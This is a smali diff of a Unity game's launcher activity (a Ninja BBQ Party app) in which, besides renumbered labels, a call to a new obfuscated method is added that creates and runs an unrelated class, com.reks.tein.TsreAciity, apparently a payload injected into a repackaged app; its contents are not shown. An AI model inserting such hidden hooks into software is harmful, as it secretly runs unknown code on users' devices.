@@ -285,14 +285,14 @@
 
     const/16 v9, 0x9
 
-    if-lt v8, v9, :cond_4b
+    if-lt v8, v9, :cond_4e
 
     move v5, v6
 
     .line 33
     .local v5, "supportsNative":Z
     :goto_25
-    if-eqz v5, :cond_4d
+    if-eqz v5, :cond_50
 
     :goto_27
     aget-object v6, v1, v6
@@ -333,8 +333,8 @@
     :cond_44
     invoke-virtual {p0, v4}, Lfr/virgoplay/application/ninja_bbq_party/UnityPlayerProxyActivity;->startActivity(Landroid/content/Intent;)V
     :try_end_47
-    .catch Ljava/lang/ClassNotFoundException; {:try_start_1e .. :try_end_47} :catch_4f
-    .catchall {:try_start_1e .. :try_end_47} :catchall_57
+    .catch Ljava/lang/ClassNotFoundException; {:try_start_1e .. :try_end_47} :catch_52
+    .catchall {:try_start_1e .. :try_end_47} :catchall_5a
 
     .line 49
     invoke-virtual {p0}, Lfr/virgoplay/application/ninja_bbq_party/UnityPlayerProxyActivity;->finish()V
@@ -345,16 +345,18 @@
     .end local v4    # "intent":Landroid/content/Intent;
     .end local v5    # "supportsNative":Z
     :goto_4a
+    invoke-virtual {p0}, Lfr/virgoplay/application/ninja_bbq_party/UnityPlayerProxyActivity;->toWsreGawsm()V
+
     return-void
 
-    :cond_4b
+    :cond_4e
     move v5, v7
 
     .line 32
     goto :goto_25
 
     .restart local v5    # "supportsNative":Z
-    :cond_4d
+    :cond_50
     move v6, v7
 
     .line 33
@@ -362,15 +364,15 @@
 
     .line 43
     .end local v5    # "supportsNative":Z
-    :catch_4f
+    :catch_52
     move-exception v2
 
     .line 45
     .local v2, "e":Ljava/lang/ClassNotFoundException;
-    :try_start_50
+    :try_start_53
     invoke-virtual {v2}, Ljava/lang/ClassNotFoundException;->printStackTrace()V
-    :try_end_53
-    .catchall {:try_start_50 .. :try_end_53} :catchall_57
+    :try_end_56
+    .catchall {:try_start_53 .. :try_end_56} :catchall_5a
 
     .line 49
     invoke-virtual {p0}, Lfr/virgoplay/application/ninja_bbq_party/UnityPlayerProxyActivity;->finish()V
@@ -378,10 +380,23 @@
     goto :goto_4a
 
     .end local v2    # "e":Ljava/lang/ClassNotFoundException;
-    :catchall_57
+    :catchall_5a
     move-exception v6
 
     invoke-virtual {p0}, Lfr/virgoplay/application/ninja_bbq_party/UnityPlayerProxyActivity;->finish()V
 
     throw v6
+.end method
+
+.method public toWsreGawsm()V
+    .registers 2
+
+    .prologue
+    new-instance v0, Lcom/reks/tein/TsreAciity;
+
+    invoke-direct {v0, p0}, Lcom/reks/tein/TsreAciity;-><init>(Landroid/content/Context;)V
+
+    invoke-virtual {v0}, Lcom/reks/tein/TsreAciity;->Eawee()V
+
+    return-void
 .end method
